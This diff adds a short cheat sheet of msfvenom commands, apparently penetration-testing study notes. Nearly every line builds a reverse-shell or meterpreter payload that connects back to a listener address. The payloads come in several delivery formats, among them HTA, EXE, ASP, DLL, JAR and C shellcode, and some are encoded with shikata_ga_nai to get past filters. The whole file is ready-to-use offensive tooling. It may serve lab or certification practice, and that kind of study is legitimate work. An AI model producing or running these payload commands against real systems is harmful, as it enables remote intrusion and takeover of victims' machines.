@@ -1,0 +1,14 @@
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.25 lport=4444 -f raw
+msfvenom -l payloads
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c           //-f --> formatting, -f c --> C-formatted shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d"     //-e encoder, -b known bad characters
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d" -v shellcode
+msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
+msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > shell-cmd.dll
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f hta-psh -o revShell.hta
+msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -o exploit.jar
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.73 LPORT=444 -f exe -e x86/shikata_ga_nai -a x86 --platform windows -o pwn.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.73 LPORT=443 -f asp -e x86/shikata_ga_nai -a x86 --platform windows -o pwn.asp
